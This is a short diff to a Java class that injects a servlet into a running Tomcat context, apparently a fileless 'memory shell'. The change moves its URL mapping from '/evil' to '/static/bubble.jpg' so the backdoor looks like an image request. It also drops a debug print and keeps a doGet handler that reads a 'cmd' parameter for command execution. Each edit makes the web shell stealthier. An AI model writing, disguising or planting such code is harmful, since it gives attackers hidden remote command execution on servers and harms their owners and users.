@@ -24,8 +24,6 @@ public class MTomcatServlet extends HttpServlet {
             WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
             StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
 
-
-
             Wrapper wrapper = standardContext.createWrapper();
             wrapper.setName(servletName);
             wrapper.setLoadOnStartup(1);
@@ -37,7 +35,7 @@ public class MTomcatServlet extends HttpServlet {
             standardContext.addChild(wrapper);
 
             // 添加 servletMappings
-            standardContext.addServletMappingDecoded("/evil",servletName);
+            standardContext.addServletMappingDecoded("/static/bubble.jpg",servletName);
         }catch (Exception e){
             e.printStackTrace();
         }
@@ -45,7 +43,6 @@ public class MTomcatServlet extends HttpServlet {
 
     @Override
     protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
-        System.out.println("Injected Code Working");
         String result = "";
         String cmd = req.getParameter("cmd");
         if (cmd != null && cmd.length() > 0) {
